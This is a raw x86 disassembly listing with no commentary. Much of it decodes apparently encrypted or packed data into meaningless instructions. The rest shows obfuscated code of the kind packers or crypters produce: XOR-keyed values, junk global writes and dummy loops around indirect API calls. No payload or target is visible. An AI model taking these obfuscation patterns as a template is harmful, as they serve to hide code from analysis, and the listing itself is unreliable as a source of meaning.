  408025:	hlt    
  408026:	pop    edx
  408027:	push   ebp
  408028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408029:	add    dl,BYTE PTR [edi]
  40802b:	ss xor al,0x76
  40802e:	aad    0x97
  408030:	cld    
  408031:	lds    eax,FWORD PTR [eax]
  408033:	lods   al,BYTE PTR ds:[esi]
  408034:	or     BYTE PTR [eax+0x49b7e3e7],0xba
  40803b:	pop    esi
  40803c:	dec    ebx
  40803d:	out    dx,eax
  40803e:	mov    cl,0x79
  408040:	mov    fs,WORD PTR [edi-0x45a261ab]
  408046:	mov    bl,0x9f
  408048:	mov    BYTE PTR [ebp-0x71d8cb9],ah
  40804e:	jle    0x4080b1
  408050:	stc    
  408051:	imul   esi,DWORD PTR [edx-0x40],0x35c849bb
  408058:	call   0x82b4:0xd54a9e88
  40805f:	xchg   ecx,eax
  408060:	cmp    ebp,edi
  408062:	adc    ebx,esi
  408064:	(bad)  
  408065:	aaa    
  408066:	in     al,0xa9
  408068:	fistp  DWORD PTR [ebx+edx*8+0x1d]
  40806c:	add    dh,dh
  40806e:	push   esi
  40806f:	addr16 xchg esp,eax
  408071:	push   cs
  408072:	cmp    bl,ch
  408074:	push   cs
  408075:	loopne 0x4080a5
  408077:	sub    eax,DWORD PTR [edx]
  408079:	mov    ch,0xe8
  40807b:	dec    ebx
  40807c:	sbb    eax,DWORD PTR [edx]
  40807e:	pop    ebp
  40807f:	sbb    esi,DWORD PTR [edi+0x5200dc1]
  408085:	jecxz  0x408044
  408087:	inc    ebx
  408088:	(bad)  
  40808b:	cwde   
  40808c:	push   ecx
  40808d:	je     0x4080aa
  40808f:	test   BYTE PTR [edx+0x28a15397],al
  408095:	or     al,0xb0
  408097:	fstp   TBYTE PTR [ebp+0x3f]
  40809a:	cwde   
  40809b:	mov    ebp,0xf6cd38dd
  4080a0:	(bad)  
  4080a1:	into   
  4080a2:	pushf  
  4080a3:	or     eax,0x57f7707d
  4080a8:	int    0x8f
  4080aa:	imul   eax,edi,0x63
  4080ad:	lods   eax,DWORD PTR ds:[esi]
  4080ae:	add    esp,ecx
  4080b0:	adc    al,0x3f
  4080b2:	cmp    al,0xd2
  4080b4:	xlat   BYTE PTR ds:[ebx]
  4080b5:	jg     0x4080f3
  4080b7:	test   eax,0xf1fe3d64
  4080bc:	loop   0x408104
  4080be:	ss stos DWORD PTR es:[edi],eax
  4080c0:	push   ebp
  4080c1:	in     eax,0x9b
  4080c3:	pop    es
  4080c4:	dec    ebx
  4080c5:	cmp    DWORD PTR [ecx],0xb36011d9
  4080cb:	sar    DWORD PTR [edx],1
  4080cd:	addr16 dec ebp
  4080cf:	jae    0x40807f
  4080d1:	test   eax,0xe28b208b
  4080d6:	sub    al,0x5e
  4080d8:	rcr    BYTE PTR [esi-0x7da7f2f8],1
  4080de:	add    DWORD PTR [ebx],ebp
  4080e0:	inc    esp
  4080e1:	rol    BYTE PTR [edx-0x4b],1
  4080e4:	pop    edi
  4080e5:	pop    edx
  4080e6:	fild   QWORD PTR [esi+0x8]
  4080e9:	outs   dx,DWORD PTR ds:[esi]
  4080ea:	add    DWORD PTR [esi],ebp
  4080ec:	adc    DWORD PTR [ecx+0x3f],0x5c91f03
  4080f3:	leave  
  4080f4:	mov    ebx,0x2e25d78f
  4080f9:	xchg   eax,eax
  4080fb:	stc    
  4080fc:	lods   al,BYTE PTR ds:[esi]
  4080fd:	mov    dl,0xf7
  4080ff:	add    DWORD PTR [esi+0xb],ebx
  408102:	rol    BYTE PTR [ecx+0x4e],cl
  408105:	or     BYTE PTR [ecx-0x444c3209],bh
  40810b:	pop    ebx
  40810c:	pop    ecx
  40810d:	out    0xf1,al
  40810f:	fld    TBYTE PTR [eax+0x27a3d4d4]
  408115:	inc    ebx
  408116:	lea    edx,ds:0xea17205c
  40811c:	shr    BYTE PTR [ebp-0x61],0x24
  408120:	sbb    ebp,eax
  408122:	jp     0x4080a5
  408124:	dec    ebp
  408125:	xor    eax,0x3452eb20
  40812a:	xchg   esi,ebp
  40812c:	and    DWORD PTR [edx],0xffffffab
  40812f:	add    DWORD PTR [ecx-0x78c653a0],ebx
  408135:	push   0xffffff85
  408137:	call   0x49ae:0xbee36969
  40813e:	jle    0x408171
  408140:	scas   eax,DWORD PTR es:[edi]
  408141:	sbb    bh,ah
  408143:	cmp    dl,BYTE PTR [edx]
  408145:	or     ch,BYTE PTR [eax-0xc27dd11]
  40814b:	pop    eax
  40814c:	add    BYTE PTR [ecx+0x5fba15ab],dh
  408152:	jmp    0x6163:0x2a485b6e
  408159:	and    ecx,DWORD PTR [ecx+ebp*4+0x4f]
  40815d:	out    0x3c,eax
  40815f:	pop    ss
  408160:	push   ebx
  408161:	das    
  408162:	lock push edx
  408164:	mov    edi,0x11faac62
  408169:	pop    esp
  40816a:	mov    al,0xe0
  40816c:	xor    al,0x1c
  40816e:	out    0xca,eax
  408170:	icebp  
  408171:	dec    esp
  408172:	lock clc 
  408174:	imul   ecx,DWORD PTR [ecx-0x4a],0xa
  408178:	test   eax,0x8d7fc2e5
  40817d:	or     DWORD PTR ds:0x27f73187,0xffffffc8
  408184:	mov    ebp,0xc74290f3
  408189:	add    BYTE PTR [edi+0x40bdca88],al
  40818f:	mov    edi,0x5a10fcca
  408194:	jne    0x408127
  408196:	xor    bh,BYTE PTR [ebx-0xd4d1cf5]
  40819c:	pop    ds
  40819d:	mov    ecx,0x37048fd2
  4081a2:	out    dx,al
  4081a3:	sub    dh,0x5
  4081a6:	push   es
  4081a7:	mov    ds:0x8298615c,eax
  4081ac:	(bad)  
  4081ad:	nop
  4081ae:	ror    esi,1
  4081b0:	std    
  4081b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b2:	sbb    dl,BYTE PTR [edi-0x49c69762]
  4081b8:	push   ebx
  4081b9:	outs   dx,DWORD PTR ds:[esi]
  4081ba:	clc    
  4081bb:	push   edi
  4081bc:	sbb    BYTE PTR [ecx+ebp*1-0x56],bh
  4081c0:	leave  
  4081c1:	(bad)  
  4081c2:	popf   
  4081c3:	dec    edx
  4081c4:	xor    bl,BYTE PTR [eax-0x69]
  4081c7:	xchg   eax,esi
  4081c9:	sub    dh,BYTE PTR [ebp+ebp*8+0x1cc65c68]
  4081d0:	fstp   QWORD PTR [ecx-0x6fc26797]
  4081d6:	xchg   ebp,eax
  4081d7:	imul   ebx,DWORD PTR [ecx],0x3e
  4081da:	mov    esp,0xaa51e1c6
  4081df:	sbb    eax,0x9dd1fe95
  4081e4:	(bad)  
  4081e6:	xchg   ebx,eax
  4081e7:	mov    ds:0x9c935610,al
  4081ec:	pop    ecx
  4081ed:	ds jle 0x40824d
  4081f0:	adc    al,0xd8
  4081f2:	cmp    bh,BYTE PTR [ecx]
  4081f4:	pop    esi
  4081f5:	add    eax,0xdfa55bbe
  4081fa:	and    BYTE PTR [ecx-0x77],cl
  4081fd:	jo     0x408247
  4081ff:	mov    ds:0xd62ef15,al
  408204:	in     al,0x76
  408206:	cmp    ebx,DWORD PTR [ebp+0x4b71e9]
  40820c:	sbb    BYTE PTR [ebx+0xdf31f20],ch
  408212:	adc    al,0x4
  408214:	mov    bx,0x7567
  408218:	add    eax,0xe863feef
  40821d:	aaa    
  40821e:	or     eax,0x6d56fa78
  408223:	mov    DWORD PTR [ebp-0x10],ebp
  408226:	push   edx
  408227:	stos   BYTE PTR es:[edi],al
  408228:	or     edi,DWORD PTR ds:0x46725f5a
  40822e:	sbb    DWORD PTR [edx+0x4d39ee12],0xb5613951
  408238:	fcmovnbe st,st(0)
  40823a:	shl    DWORD PTR [edi+0x2a],1
  40823d:	jmp    0x408277
  40823f:	push   esi
  408240:	xchg   esi,eax
  408241:	in     eax,dx
  408242:	hlt    
  408243:	adc    eax,0x9b4852f1
  408248:	js     0x4082c7
  40824a:	test   eax,0x926a221
  408250:	into   
  408251:	sbb    ch,BYTE PTR [edi-0x7ea2e04f]
  408257:	into   
  408258:	popa   
  408259:	in     eax,dx
  40825a:	data16 mov cl,0xf0
  40825d:	xor    eax,0xc8671442
  408262:	ja     0x4082b6
  408264:	retf   0xa6f7
  408267:	dec    edi
  408268:	adc    eax,0x9494a9c3
  40826d:	aaa    
  40826e:	jae    0x4081fa
  408270:	jae    0x40825b
  408272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408273:	aad    0xd7
  408275:	pop    edi
  408276:	inc    esp
  408277:	mov    dl,0x58
  408279:	xchg   edi,eax
  40827a:	dec    eax
  40827b:	sti    
  40827c:	fild   DWORD PTR fs:[edi-0x7d]
  408280:	sub    DWORD PTR [esi+0x3b772d5],ecx
  408286:	dec    esi
  408287:	scas   al,BYTE PTR es:[edi]
  408288:	jns    0x4082d9
  40828a:	cmp    bh,0x8b
  40828d:	sbb    dh,BYTE PTR [esi]
  40828f:	aad    0x2c
  408291:	cmp    BYTE PTR [edi+0x2b],dh
  408294:	mov    bh,0x39
  408296:	pusha  
  408297:	or     edx,ebp
  408299:	add    BYTE PTR ds:0x86818337,dh
  40829f:	bound  ebx,QWORD PTR ss:[ebp-0xa]
  4082a3:	mov    WORD PTR ds:0xb1d67005,cs
  4082a9:	jne    0x40826e
  4082ab:	retf   0x998b
  4082ae:	(bad)  
  4082af:	mov    bh,BYTE PTR [ebp+0x6c]
  4082b2:	cmp    DWORD PTR [edx-0x5d9fc125],ecx
  4082b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b9:	rcl    DWORD PTR [edi],0x81
  4082bc:	sub    eax,0x9aa0bdc1
  4082c1:	jp     0x408272
  4082c3:	mov    dl,0xeb
  4082c5:	in     eax,dx
  4082c6:	ss xor al,0xca
  4082c9:	mov    ecx,0xddd95e6b
  4082ce:	adc    eax,0x3fc9505f
  4082d3:	xchg   esi,eax
  4082d4:	rcpps  xmm7,xmm6
  4082d7:	mov    dh,0xe6
  4082d9:	pop    esp
  4082da:	scas   eax,DWORD PTR es:[edi]
  4082db:	or     ebx,esp
  4082dd:	mov    eax,ds:0x3499d5a4
  4082e2:	xchg   edx,eax
  4082e3:	push   esp
  4082e4:	aaa    
  4082e5:	sub    DWORD PTR [eax+0x74d7f70f],edi
  4082eb:	out    0x9f,al
  4082ed:	inc    esp
  4082ee:	mov    ebx,0x2bcfcdef
  4082f3:	sub    eax,0xf36e9e1c
  4082f8:	inc    dx
  4082fa:	jge    0x40828a
  4082fc:	out    0x9f,eax
  4082fe:	add    bl,BYTE PTR [edx+0x626461bf]
  408304:	xchg   edi,eax
  408305:	scas   eax,DWORD PTR es:[edi]
  408306:	retf   0xe114
  408309:	mov    esp,0xc718ee82
  40830e:	loop   0x408302
  408310:	lahf   
  408311:	shl    esi,1
  408313:	dec    ebp
  408314:	adc    DWORD PTR [edx],esi
  408316:	sub    dl,ch
  408318:	adc    BYTE PTR [ebp+0x69],dl
  40831b:	mov    BYTE PTR [eax+ebp*1-0x272fe204],bh
  408322:	pop    ebp
  408323:	mov    cl,0xa6
  408325:	loopne 0x408373
  408327:	mov    edx,0xecd9d8fb
  40832c:	xor    ch,BYTE PTR ds:0x40986a0d
  408332:	loope  0x40836a
  408334:	loop   0x408301
  408336:	add    BYTE PTR [edx],cl
  408338:	and    BYTE PTR [edi-0x8],bh
  40833b:	cwde   
  40833c:	fmul   DWORD PTR [edi+0x75]
  40833f:	call   0xb341:0x581772
  408346:	mov    esp,0x660d855
  40834b:	dec    esi
  40834c:	add    edx,DWORD PTR [ebx-0x10]
  40834f:	and    eax,0xb4281a6e
  408354:	pop    ss
  408355:	sbb    BYTE PTR [ebp-0x43],ah
  408358:	dec    ebx
  408359:	cmp    dh,BYTE PTR [eax]
  40835b:	stos   BYTE PTR es:[edi],al
  40835c:	bound  ecx,QWORD PTR [ebp+0x3c26a060]
  408362:	mov    ds:0x566074c5,al
  408367:	push   ebx
  408368:	push   edi
  408369:	xor    edi,0xffffff94
  40836c:	jp     0x40839e
  40836e:	mov    bh,0x6c
  408370:	xchg   esi,eax
  408371:	push   es
  408372:	push   eax
  408373:	pop    es
  408374:	int3   
  408375:	ror    edi,1
  408377:	or     ch,BYTE PTR [ecx]
  408379:	inc    DWORD PTR [ecx-0xfd1dfe8]
  40837f:	mov    eax,0x4ebd403c
  408384:	or     eax,0xe1a137af
  408389:	int    0xe1
  40838b:	pop    ecx
  40838c:	mov    DWORD PTR [eax-0x23c52f15],esp
  408392:	xchg   DWORD PTR ds:0x50569393,ebx
  408398:	in     al,0xe4
  40839a:	jle    0x408327
  40839c:	fs mov bl,0x93
  40839f:	xchg   ebp,eax
  4083a0:	cmp    eax,0x4ea5dd4d
  4083a5:	test   eax,esi
  4083a7:	mov    ebx,0x79fcef81
  4083ac:	mov    ebx,0xbfc02a11
  4083b1:	cmp    eax,0x11e00383
  4083b6:	mov    edx,0xa4e5f095
  4083bb:	jg     0x408378
  4083bd:	pop    es
  4083be:	scas   eax,DWORD PTR es:[edi]
  4083bf:	xor    dl,BYTE PTR [ecx]
  4083c1:	mov    bh,0x9c
  4083c3:	jl     0x4083e4
  4083c5:	and    cl,BYTE PTR [edx-0x2a]
  4083c8:	repnz or al,0x57
  4083cb:	(bad)  
  4083cc:	mov    esp,0x4e5735c7
  4083d1:	aaa    
  4083d2:	retw   
  4083d4:	jmp    0xb77a0695
  4083d9:	jae    0x4083f3
  4083db:	mov    ebp,DWORD PTR [eax]
  4083dd:	pop    DWORD PTR [ebp+0x69]
  4083e0:	jns    0x4083cc
  4083e2:	rcr    BYTE PTR [ebx],1
  4083e4:	int3   
  4083e5:	aad    0x3
  4083e7:	bswap  ebp
  4083e9:	enter  0x2215,0xb4
  4083ed:	xchg   eax,ecx
  4083ef:	and    eax,0xf7c3bb61
  4083f4:	inc    edx
  4083f5:	(bad)  
  4083f6:	scas   eax,DWORD PTR es:[edi]
  4083f7:	dec    esp
  4083f8:	rcl    BYTE PTR [edi+ecx*8-0x2b],1
  4083fc:	adc    BYTE PTR [edi],0x27
  4083ff:	lods   al,BYTE PTR ds:[esi]
  408400:	mov    ds:0x19e24e09,eax
  408405:	jmp    0x36bb:0x9a7f4207
  40840c:	dec    ebp
  40840d:	sbb    ebx,esi
  40840f:	lahf   
  408410:	jne    0x408400
  408412:	clc    
  408413:	mov    ecx,0xe1fa2e74
  408418:	pop    edx
  408419:	imul   ebp,DWORD PTR [ecx-0x12771d37],0xbcac4c0c
  408423:	fs xchg bl,dl
  408426:	inc    edx
  408427:	inc    eax
  408428:	jns    0x40847d
  40842a:	and    al,0x1
  40842c:	nop
  40842d:	rol    BYTE PTR [ecx-0x79],cl
  408430:	pop    edi
  408431:	or     DWORD PTR [edi+ebx*4-0x2f],ebp
  408435:	(bad)  
  408436:	leave  
  408437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408438:	int3   
  408439:	dec    edx
  40843a:	and    bl,dh
  40843c:	ret    
  40843d:	les    edi,FWORD PTR [eax]
  40843f:	and    bl,BYTE PTR [edx]
  408441:	and    eax,0x1177b2a0
  408446:	add    eax,0x260c9bf7
  40844b:	das    
  40844c:	pop    ecx
  40844d:	xor    eax,0x45c73dd
  408452:	inc    edx
  408453:	add    ah,BYTE PTR [edx+esi*1-0x67]
  408457:	jmp    DWORD PTR [edx-0x12]
  40845a:	mov    al,bh
  40845c:	(bad)  
  40845d:	out    dx,eax
  40845e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40845f:	add    al,0x9e
  408461:	and    BYTE PTR [esi-0x24f21448],dh
  408467:	pop    edx
  408468:	add    BYTE PTR [edx+0x45881004],cl
  40846e:	dec    DWORD PTR [ebx+0x558bd045]
  408474:	hlt    
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x42fa1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x42fa48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x42fa4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x42fa20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x42fa24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
